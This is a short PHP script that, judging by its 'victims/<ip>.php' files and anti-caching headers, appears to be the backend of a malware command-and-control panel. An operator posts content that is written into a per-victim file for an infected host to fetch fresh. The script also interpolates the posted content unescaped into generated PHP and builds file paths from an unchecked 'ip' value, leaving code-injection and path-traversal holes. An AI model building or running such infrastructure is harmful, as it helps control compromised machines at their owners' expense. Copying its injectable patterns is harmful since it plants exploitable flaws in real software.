<?php
if (isset($_POST['ip']) && isset($_POST['content'])) {
    $ip = $_POST['ip'];
    $newContent = $_POST['content'];
    $filePath = 'victims/' . $ip . '.php';

    // Check if the file exists before attempting to modify
    if (file_exists($filePath)) {
        // The new content to write into the file
        $newFileContent = "<?php\n\n"
            . "header_remove('ETag');\n"
            . "header_remove('Pragma');\n"
            . "header_remove('Cache-Control');\n"
            . "header_remove('Last-Modified');\n"
            . "header_remove('Expires');\n\n"
            . "header('Expires: Thu, 1 Jan 1970 00:00:00 GMT');\n"
            . "header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');\n"
            . "header('Cache-Control: post-check=0, pre-check=0',false);\n"
            . "header('Pragma: no-cache');\n\n"
            . "echo \"$newContent\";\n"
            . "?>";

// Write the new content into the file
if (file_put_contents($filePath, $newFileContent)) {
echo 'success'; // Return success if the file is modified
} else {
echo 'error'; // Return error if there was a problem modifying the file
}
} else {
echo 'error'; // File doesn't exist
}
} else {
echo 'error'; // IP or content not provided
}
?>